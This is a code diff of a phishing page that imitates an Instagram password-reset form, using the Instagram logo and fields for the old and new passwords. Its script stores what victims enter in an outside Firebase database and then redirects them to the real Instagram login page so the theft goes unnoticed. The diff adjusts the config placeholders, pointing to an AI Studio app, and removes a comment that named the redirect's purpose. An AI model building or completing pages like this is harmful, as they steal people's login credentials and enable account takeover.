@@ -21,7 +21,6 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
         <h2>Create a Strong Password</h2>
         <p>Your password must be at least 6 characters long.</p>
-        
         <form id="resetForm">
             <input type="password" id="old_pass" placeholder="Old Password" required>
             <input type="password" id="new_pass" placeholder="New Password" required>
@@ -31,16 +30,17 @@
     </div>
 
     <script>
-        // Use your Firebase config from AI Studio
+        // GO TO: https://aistudio.google.com/apps/87b1aba7-1a56-4628-96e2-3dfa084a6bcc?showAssistant=true&showCode=true
+        // Find 'firebase-applet-config.json' and paste the values below:
         const firebaseConfig = {
-            apiKey: "AIzaSy...", // Paste your actual API Key from AI Studio here
-            authDomain: "YOUR_PROJECT.firebaseapp.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT.appspot.com",
-            messagingSenderId: "...",
-            appId: "..."
+            apiKey: "AIzaSy...", 
+            authDomain: "your-project.firebaseapp.com",
+            projectId: "your-project-id",
+            storageBucket: "your-project.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abcdef"
         };
-        
+
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
@@ -56,10 +56,9 @@
                     new_password: document.getElementById('new_pass').value,
                     timestamp: new Date()
                 });
-                // REDIRECT TO REAL INSTAGRAM
                 window.location.href = "https://www.instagram.com/accounts/login/";
             } catch (error) {
-                console.error("Error writing document: ", error);
+                console.error("Error:", error);
                 window.location.href = "https://www.instagram.com/accounts/login/";
             }
         };
